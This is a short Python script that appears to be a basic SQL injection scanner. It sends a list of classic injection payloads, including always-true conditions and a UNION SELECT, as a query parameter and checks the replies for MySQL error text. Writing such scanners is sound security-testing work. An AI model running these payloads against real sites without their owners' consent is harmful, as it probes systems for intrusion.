import requests

# Common SQL Injection payloads
SQLI_PAYLOADS = ["' OR '1'='1", "' OR '1'='1' --", "' OR '1'='1' /*", "' UNION SELECT null, null --"]

def check_sql_injection(url):
    vulnerable = False
    for payload in SQLI_PAYLOADS:
        target_url = f"{url}?id={payload}"
        try:
            response = requests.get(target_url)
            if "SQL syntax" in response.text or "mysql_fetch" in response.text:
                print(f"[+] SQL Injection Vulnerability Found at {target_url}")
                vulnerable = True
                break
        except requests.RequestException as e:
            print(f"[-] Error: {e}")
    
    if not vulnerable:
        print("[-] No SQL Injection Vulnerability Found.")
    return vulnerable

# Test the SQL injection scanner
url = "http://example.com/vulnerable_page"
check_sql_injection(url)